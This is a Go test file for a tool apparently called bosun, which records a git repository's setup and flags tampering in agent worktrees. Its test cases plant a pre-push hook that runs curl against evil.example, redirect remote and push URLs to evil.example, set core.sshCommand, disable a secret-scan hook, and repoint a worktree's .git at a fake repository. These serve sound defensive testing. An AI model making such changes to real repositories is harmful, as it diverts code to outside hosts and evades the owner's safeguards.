package main

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

// recorded makes a repository with a remote and a worktree, and records its setup.
func recorded(t *testing.T) (r gitRepos, repo, wt string) {
	t.Helper()
	repo = t.TempDir()
	git(t, repo, "init", "-q", "-b", "main")
	git(t, repo, "commit", "-q", "--allow-empty", "-m", "init")
	git(t, repo, "remote", "add", "origin", "https://forge.example/x.git")
	git(t, repo, "config", "branch.main.remote", "origin")
	wt = filepath.Join(repo, ".claude", "worktrees", "b")
	git(t, repo, "worktree", "add", "-q", "-b", "worktree-b", wt)
	r = gitRepos{dir: filepath.Join(t.TempDir(), "repos")}
	if got := r.changed(wt); got != "bosun has no record of" {
		t.Fatalf("changed before the record = %q", got)
	}
	if err := r.record(repo); err != nil {
		t.Fatal(err)
	}
	if got := r.changed(wt); got != "" {
		t.Fatalf("changed right after the record = %q", got)
	}
	return r, repo, wt
}

func TestGitSetupChanged(t *testing.T) {
	for _, tc := range []struct {
		name   string
		change func(t *testing.T, repo, wt string)
		want   string
	}{
		{"a pre-push hook", func(t *testing.T, repo, _ string) {
			writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-push"), "#!/bin/sh\ncurl https://evil.example\n", 0o755)
		}, "whose hook pre-push changed"},
		{"a sample hook made executable", func(t *testing.T, repo, _ string) {
			if err := os.Chmod(filepath.Join(repo, ".git", "hooks", "pre-push.sample"), 0o777); err != nil {
				t.Fatal(err)
			}
		}, "whose hook pre-push.sample changed"},
		{"a pipe among the hooks", func(t *testing.T, repo, _ string) {
			if err := syscall.Mkfifo(filepath.Join(repo, ".git", "hooks", "reference-transaction"), 0o755); err != nil {
				t.Fatal(err)
			}
		}, "whose hook reference-transaction changed"},
		{"core.sshCommand", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "core.sshCommand", "/tmp/x")
		}, "whose config's core.sshcommand changed"},
		{"core.hooksPath", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "core.hooksPath", ".githooks")
		}, "whose config's core.hookspath changed"},
		{"the remote's URL", func(t *testing.T, _, wt string) {
			git(t, wt, "remote", "set-url", "origin", "https://evil.example/x.git")
		}, "whose config's remote.origin.url changed"},
		{"a push URL", func(t *testing.T, _, wt string) {
			git(t, wt, "remote", "set-url", "--push", "origin", "https://evil.example/x.git")
		}, "whose config's remote.origin.pushurl changed"},
		{"pushInsteadOf", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "url.https://evil.example/.pushInsteadOf", "https://forge.example/")
		}, "whose config's url.https://evil.example/.pushinsteadof changed"},
		{"an include", func(t *testing.T, _, wt string) {
			writeFile(t, filepath.Join(wt, "evil.cfg"), "[core]\n\tsshCommand = /tmp/x\n", 0o644)
			git(t, wt, "config", "include.path", filepath.Join(wt, "evil.cfg"))
		}, "whose config's core.sshcommand changed"},
		{"a worktree config", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "extensions.worktreeConfig", "true")
		}, "whose config's extensions.worktreeconfig changed"},
		{"a new remote", func(t *testing.T, _, wt string) {
			git(t, wt, "remote", "add", "evil", "https://evil.example/x.git")
		}, "whose config's remote.evil.fetch changed"},
		{"a branch pushing to a URL", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "branch.worktree-b.pushRemote", "https://evil.example/x.git")
		}, "whose branch config names https://evil.example/x.git, not a recorded remote"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, repo, wt := recorded(t)
			tc.change(t, repo, wt)
			start := time.Now()
			if got := r.changed(wt); got != tc.want {
				t.Fatalf("changed = %q, want %q", got, tc.want)
			}
			if took := time.Since(start); took > 3*time.Second {
				t.Fatalf("changed took %v", took)
			}
		})
	}
}

func TestGitSetupKeepsRoutineChanges(t *testing.T) {
	r, repo, wt := recorded(t)
	git(t, wt, "config", "branch.worktree-b.remote", "origin")
	git(t, wt, "config", "branch.worktree-b.merge", "refs/heads/worktree-b")
	git(t, repo, "branch", "--track", "local", "main")
	if got := r.changed(wt); got != "" {
		t.Fatalf("changed after setting upstreams = %q", got)
	}
	if got := r.changed(repo); got != "" {
		t.Fatalf("changed in the main checkout = %q", got)
	}

	// A second record keeps the first.
	writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-push"), "#!/bin/sh\n", 0o755)
	if err := r.record(repo); err != nil {
		t.Fatal(err)
	}
	if got := r.changed(wt); got != "whose hook pre-push changed" {
		t.Fatalf("changed after a second record = %q", got)
	}
}

func TestGitSetupHooks(t *testing.T) {
	for _, tc := range []struct {
		name   string
		change func(t *testing.T, repo, wt string)
		want   string
	}{
		{"nothing", func(*testing.T, string, string) {}, ""},
		{"core.sshCommand", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "core.sshCommand", "/tmp/x")
		}, ""},
		{"a new remote", func(t *testing.T, _, wt string) {
			git(t, wt, "remote", "add", "evil", "https://evil.example/x.git")
		}, ""},
		{"a disabled hook", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "hook.secret-scan.enabled", "false")
		}, "whose config's hook.secret-scan.enabled changed"},
		{"a disabled event", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "hook.pre-push.enabled", "false")
		}, "whose config's hook.pre-push.enabled changed"},
		{"core.hooksPath", func(t *testing.T, _, wt string) {
			git(t, wt, "config", "core.hooksPath", "/dev/null")
		}, "whose config's core.hookspath changed"},
		{"an include", func(t *testing.T, _, wt string) {
			writeFile(t, filepath.Join(wt, "off.cfg"), "[hook \"secret-scan\"]\n\tenabled = false\n", 0o644)
			git(t, wt, "config", "include.path", filepath.Join(wt, "off.cfg"))
		}, "whose config's hook.secret-scan.enabled changed"},
		{"a pre-push hook", func(t *testing.T, repo, _ string) {
			writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-push"), "#!/bin/sh\n", 0o755)
		}, "whose hook pre-push changed"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, repo, wt := recorded(t)
			tc.change(t, repo, wt)
			if got := r.hooks(wt); got != tc.want {
				t.Fatalf("hooks = %q, want %q", got, tc.want)
			}
		})
	}
}

// A repository without a record, such as one a worker made, may hold hooks of its own, but its config may not touch the user's.
func TestGitSetupHooksWithoutRecord(t *testing.T) {
	r := gitRepos{dir: filepath.Join(t.TempDir(), "repos")}
	repo := t.TempDir()
	git(t, repo, "init", "-q")
	writeFile(t, filepath.Join(repo, ".git", "hooks", "pre-push"), "#!/bin/sh\n", 0o755)
	if got := r.hooks(repo); got != "" {
		t.Fatalf("hooks = %q", got)
	}
	git(t, repo, "config", "hook.secret-scan.enabled", "false")
	if got := r.hooks(repo); got != "whose config's hook.secret-scan.enabled changed" {
		t.Fatalf("hooks with a disabled hook = %q", got)
	}
	if got := r.hooks(t.TempDir()); got != "bosun cannot read" {
		t.Fatalf("hooks outside a repository = %q", got)
	}
}

// A worker can point its worktree's .git at a repository of its own, which bosun has no record of.
func TestGitSetupFollowsTheGitDir(t *testing.T) {
	r, _, wt := recorded(t)
	fake := filepath.Join(wt, "fake")
	git(t, wt, "init", "-q", fake)
	writeFile(t, filepath.Join(wt, ".git"), "gitdir: "+filepath.Join(fake, ".git")+"\n", 0o644)
	if got := r.changed(wt); got != "bosun has no record of" {
		t.Fatalf("changed = %q", got)
	}
	if got := r.changed(t.TempDir()); got != "bosun cannot read" {
		t.Fatalf("changed outside a repository = %q", got)
	}
}

func TestGitReposRemotes(t *testing.T) {
	r, _, wt := recorded(t)
	if got := strings.Join(r.remotes(wt), " "); got != "origin" {
		t.Fatalf("remotes = %q", got)
	}
	if got := r.remotes(t.TempDir()); got != nil {
		t.Fatalf("remotes outside a repository = %q", got)
	}
}

func writeFile(t *testing.T, path, content string, mode os.FileMode) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), mode); err != nil {
		t.Fatal(err)
	}
}
